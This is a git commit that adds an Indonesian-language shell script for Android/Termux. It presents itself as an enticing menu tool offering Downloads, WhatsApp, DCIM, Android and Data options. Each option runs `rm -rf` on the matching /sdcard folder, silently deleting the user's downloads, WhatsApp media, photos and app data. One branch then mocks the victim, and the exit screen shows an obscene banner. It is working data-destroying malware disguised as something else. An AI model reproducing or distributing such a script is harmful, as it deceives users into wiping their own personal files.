baef9321ceed1002f501d4ab6c66c16903cb4d35
Mr. Mpx7 Aril Al Farel <56549838+FriendsDefacerTeam@users.noreply.github.com>
2019-10-26 17:02:58 +0700

    Add files via upload

---
+++ RuS4K.sh
@@ -0,0 +1,108 @@
+#!/bin/sh
+#Mod By Mr.Mpx7
+
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+figlet -f slant 'P3nGRus4K' | lolcat
+date | lolcat
+echo $yellow"_______________________________"
+echo $yellow"|"$red" Jangan Menyesal,,,,,"
+echo $yellow"|"$cyan" Jadilah Yang Pertama Mendapatkan SensasiNya"
+echo $yellow"|"$white":::::::::]> -_-* "
+echo $yellow"|______________________________"
+echo
+echo $red"[1]"$cyan"Downloads"
+echo "============================>" | lolcat
+echo $red"[2]"$cyan"WhatsApp"
+echo "============================>" | lolcat
+echo $red"[3]"$cyan"DCIM"
+echo "============================>" | lolcat
+echo $red"[4]"$cyan"Android"
+echo "============================>" | lolcat
+echo $red"[5]"$cyan"Data"
+echo
+echo $cyan"[ E ]"$red"EXIT"$cyan"[ C ]"$red"Countinew"
+echo $white"Pilih"
+read -p "r00t@Mr.MPX7:~# " bro
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+echo $green"_________________________"
+echo $green"|"$dark" PengHancur" $white"-_-*"
+echo $green"|________________________"
+sleep 1
+apt update && apt upgrade
+cd /sdcard
+rm -rf Download
+fi
+
+if [ $bro = 2 ] || [ $bro = 2 ]
+then
+echo $green"_________________________"
+echo $green"|"$dark" PengHancur" $white"-_-*"
+echo $green"|________________________"
+sleep 1
+apt update && apt upgrade
+cd /sdcard
+rm -rf WhatsApp
+fi
+
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+echo $green"_________________________"
+echo $green"|"$dark" PengHancur" $white"-_-*"
+echo $green"|________________________"
+sleep 1
+apt update && apt upgrade
+cd /sdcard
+rm -rf DCIM
+fi
+
+if [ $bro = 4 ] || [ $bro = 4 ]
+then
+echo $green"_________________________"
+echo $green"|"$dark" PengHancur" $white"-_-*"
+echo $green"|________________________"
+sleep 1
+apt update && apt upgrade
+cd /sdcard
+rm -rf Android
+fi
+
+if [ $bro = 5 ] || [ $bro = 5 ]
+then
+echo $green"_________________________"
+echo $green"|"$dark" PengHancur" $white"-_-*"
+echo $green"|________________________"
+sleep 1
+apt update && apt upgrade
+cd /sdcard
+rm -rf data
+echo $red"hahahahaha Kasian Deh Loe,,,,"
+fi
+
+if [ $bro = C ] || [ $bro = c ]
+then
+clear
+sh friends.sh
+fi
+
+if [ $bro = E ] || [ $bro = e ]
+then
+clear
+echo $cyan" _____           _     __   __"
+echo $red"|  ___|   _  ___| | __ \ \ / /__  _   _"
+echo $purple"| |_ | | | |/ __| |/ /  \ V / _ \| | | |"
+echo $cyan"|  _|| |_| | (__|   <    | | (_) | |_| |"
+echo $red"|_|   \__,_|\___|_|\_\   |_|\___/ \__,_|"
+sleep 1
+clear
+echo $white "======[Maafkan Saya My Friends]======"
+fi
+
